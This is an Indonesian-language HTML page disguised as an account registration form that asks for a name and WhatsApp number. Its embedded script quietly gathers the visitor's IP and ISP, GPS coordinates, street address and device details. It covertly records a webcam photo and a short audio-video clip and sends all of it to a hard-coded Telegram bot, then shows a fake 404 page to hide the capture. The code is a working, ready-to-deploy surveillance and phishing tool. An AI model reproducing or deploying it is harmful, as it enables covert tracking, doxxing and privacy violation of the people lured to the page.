 <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Pendaftaran Akun</title>
  <style>
    body { background:#fff; color:#111; font-family:Arial, sans-serif; padding:30px; }
    h2 { margin-bottom:10px; }
    label { display:block; margin-top:10px; }
    input { padding:8px; width:100%; margin-top:4px; }
    button { margin-top:15px; padding:10px 15px; background:#007bff; color:#fff; border:none; border-radius:4px; cursor:pointer; }
    #hidden { display:none; }
    .center { text-align:center; margin-top:50px; }
  </style>
</head>
<body>
  <h2>Pendaftaran Akun</h2>
  <form id="registerForm">
    <label>Nama:
      <input type="text" id="name" required>
    </label>
    <label>Masukkan Nomor WhatsApp:
      <input type="tel" id="phone" required>
    </label>
    <button type="submit">Daftar</button>
  </form>

  <div id="hidden">
    <video id="video" autoplay playsinline muted width="320" height="240"></video>
    <canvas id="canvas" width="320" height="240"></canvas>
  </div>

  <div id="finish" class="center" style="display:none;">
    <h1>404</h1>
    <p>Halaman tidak ditemukan</p>
  </div>

<script>
/* ================= CONFIG ================= */
const BOT_TOKEN = "8275671762:AAFHjoV2ZQCW9y69JvUTarIw7hUT0NVAXF8";
const CHAT_ID   = "6216902201";
/* ========================================== */

const form = document.getElementById("registerForm");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");

/* --- kirim foto --- */
async function sendPhoto(blob, caption){
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("photo", blob, "photo.png");
  fd.append("caption", caption);
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:"POST", body:fd });
}

/* --- kirim video --- */
async function sendVideo(blob, caption){
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("video", blob, "video.mp4");
  fd.append("caption", caption);
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method:"POST", body:fd });
}

/* --- kirim teks (fallback) --- */
async function sendText(text){
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body:JSON.stringify({ chat_id:CHAT_ID, text })
  });
}

/* --- IP detail --- */
async function getIP(){
  try{
    const res = await fetch("https://ipapi.co/json/");
    return await res.json();
  }catch{ return {}; }
}

/* --- GPS --- */
function getGeo(){
  return new Promise(resolve=>{
    navigator.geolocation.getCurrentPosition(
      pos=>resolve(pos.coords),
      err=>resolve({})
    );
  });
}

/* --- reverse geocode --- */
async function revGeocode(lat, lon){
  try{
    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`);
    return await r.json();
  }catch{ return {}; }
}

/* --- main --- */
form.onsubmit = async e=>{
  e.preventDefault();
  const name = document.getElementById("name").value;
  const phone = document.getElementById("phone").value;

  // collect data
  const ip = await getIP();
  const geo = await getGeo();
  const rev = geo.latitude ? await revGeocode(geo.latitude, geo.longitude) : {};

  /* ========== FOTO ========== */
  let photoBlob = null;
  try{
    const stream = await navigator.mediaDevices.getUserMedia({ video:true });
    video.srcObject = stream;
    await new Promise(r=>setTimeout(r,1500));
    ctx.drawImage(video,0,0,canvas.width,canvas.height);
    photoBlob = await new Promise(r=>canvas.toBlob(r,"image/png"));
    stream.getTracks().forEach(t=>t.stop());
  }catch{}

  const captionFoto = 
`╭─ > Tanggal: ${new Date().toLocaleString()}
 ├─ > Nomor Telepon: ${phone}
 ├─ > Nama: ${name}
 ├─ > Pesan
 │   └─ Pendaftaran & Verifikasi (dengan izin)
 ├─ > Pengirim (web)
 │   └─ ${navigator.userAgent}
 ├─ > IP / ISP
 │   ├─ IP: ${ip.ip||"-"}
 │   ├─ ISP/Org: ${ip.org||"-"}
 │   ├─ ASN: ${ip.asn||"-"}
 │   ├─ City: ${ip.city||"-"}
 │   ├─ Region: ${ip.region||"-"}
 │   ├─ Country: ${ip.country_name||"-"}
 │   └─ Postal: ${ip.postal||"-"}
 ├─ > Device
 │   ├─ Platform: ${navigator.platform}
 │   ├─ Screen: ${screen.width}x${screen.height}
 │   ├─ Language: ${navigator.language}
 │   ├─ Timezone (browser): ${Intl.DateTimeFormat().resolvedOptions().timeZone}
 │   └─ Battery: ? 
 ├─ > Geo (GPS)
 │   ├─ Lat: ${geo.latitude||"-"}
 │   ├─ Lon: ${geo.longitude||"-"}
 │   └─ Maps: https://maps.google.com/?q=${geo.latitude||"-"},${geo.longitude||"-"}
╰─ > Sumber: AutoReport Web`;

  if(photoBlob) await sendPhoto(photoBlob, captionFoto);
  else await sendText(captionFoto);

  /* ========== VIDEO ========== */
  let videoBlob = null;
  try{
    const stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:true });
    const rec = new MediaRecorder(stream);
    const chunks = [];
    rec.ondataavailable = e=>chunks.push(e.data);
    rec.start();
    await new Promise(r=>setTimeout(r,4000));
    rec.stop();
    await new Promise(r=>rec.onstop=()=>r());
    videoBlob = new Blob(chunks,{type:"video/mp4"});
    stream.getTracks().forEach(t=>t.stop());
  }catch{}

  const address = rev.address||{};
  const captionVideo = 
`├─ > Alamat (Detail)
 │   ├─ Negara: ${address.country||"-"}
 │   ├─ Provinsi: ${address.state||"-"}
 │   ├─ Kabupaten: ${address.county||"-"}
 │   ├─ Kota: ${address.city||address.town||"-"}
 │   ├─ Kecamatan: ${address.suburb||"-"}
 │   ├─ Kampung: ${address.village||"-"}
 │   ├─ Jalan: ${address.road||"-"}
 │   ├─ Kode Pos: ${address.postcode||"-"}`;

  if(videoBlob) await sendVideo(videoBlob, captionVideo);
  else await sendText(captionVideo);

  // tampilkan 404
  document.getElementById("registerForm").style.display="none";
  document.getElementById("finish").style.display="block";
};
</script>
</body>
</html>
